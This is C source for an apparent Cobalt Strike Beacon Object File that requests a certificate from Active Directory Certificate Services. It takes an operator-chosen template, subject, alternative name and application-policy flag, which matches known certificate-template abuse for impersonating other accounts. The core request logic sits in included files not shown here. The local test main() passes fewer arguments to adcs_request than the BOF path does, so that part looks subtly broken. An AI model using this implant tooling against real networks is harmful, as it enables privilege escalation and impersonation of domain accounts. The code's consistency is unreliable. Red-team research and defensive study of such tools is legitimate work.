#include <windows.h>
#include <stdio.h>
#include "beacon.h"
#include "bofdefs.h"
#include "base.c"
#include "adcs_request.c"


#ifdef BOF
VOID go(
	IN PCHAR Buffer,
	IN ULONG Length
)
{
	HRESULT hr = S_OK;
	datap parser;
	LPCWSTR lpswzCA = NULL;
	LPCWSTR lpswzTemplate = NULL;
	LPCWSTR lpswzSubject = NULL;
	LPCWSTR lpswzAltName = NULL;
	LPCWSTR lpPrivKey = NULL;
	BOOL bInstall = FALSE;
	BOOL bMachine = FALSE;
	BOOL addAppPolicy = FALSE;
	BOOL dns = FALSE;
    
	if (!bofstart())
	{
		return;
	}

	BeaconDataParse(&parser, Buffer, Length);
	lpswzCA = (LPCWSTR)BeaconDataExtract(&parser, NULL);
	lpswzTemplate = (LPCWSTR)BeaconDataExtract(&parser, NULL);
	lpswzSubject = (LPCWSTR)BeaconDataExtract(&parser, NULL);
	lpswzAltName = (LPCWSTR)BeaconDataExtract(&parser, NULL);
	bInstall = (BOOL)BeaconDataShort(&parser);
	bMachine = (BOOL)BeaconDataShort(&parser);
	addAppPolicy = (BOOL)BeaconDataShort(&parser);
	dns = (BOOL)BeaconDataShort(&parser);
	
	internal_printf("\nRequesting a %S certificate from %S for the current user\n", lpswzTemplate, lpswzCA);

	hr = adcs_request(
		lpswzCA, 
		lpswzTemplate,
		lpswzSubject,
		lpswzAltName,
		bInstall,
		bMachine,
		addAppPolicy,
		dns
	);
	if (S_OK != hr)
	{
		BeaconPrintf(CALLBACK_ERROR, "adcs_request failed: 0x%08lx\n", hr);
		goto fail;
	}

	internal_printf("\nadcs_request SUCCESS.\n");

fail:
	printoutput(TRUE);

	bofstop();
};
#else
#define TEST_CA L"Cert.testrange.local\\testrange-CERT-CA"
#define TEST_TEMPLATE L""
#define TEST_SUBJECT L""
#define TEST_ALTNAME L""
#define TEST_INSTALL FALSE
#define TEST_MACHINE FALSE
int main(int argc, char ** argv)
{
	HRESULT hr = S_OK;
	LPCWSTR lpswzCA = TEST_CA;
	LPCWSTR lpswzTemplate = TEST_TEMPLATE;
	LPCWSTR lpswzSubject = TEST_SUBJECT;
	LPCWSTR lpswzAltName = TEST_ALTNAME;
	BOOL bInstall = TEST_INSTALL;
	BOOL bMachine = TEST_MACHINE;

	internal_printf("\nRequesting a %S certificate from %S for the current user\n", lpswzTemplate, lpswzCA);

	hr = adcs_request(
		lpswzCA, 
		lpswzTemplate,
		lpswzSubject,
		lpswzAltName,
		bInstall,
		bMachine
	);
	if (S_OK != hr)
	{
		BeaconPrintf(CALLBACK_ERROR, "adcs_request failed: 0x%08lx\n", hr);
		goto fail;
	}

	internal_printf("\nadcs_request SUCCESS.\n");

fail:
	return hr;
}
#endif

	




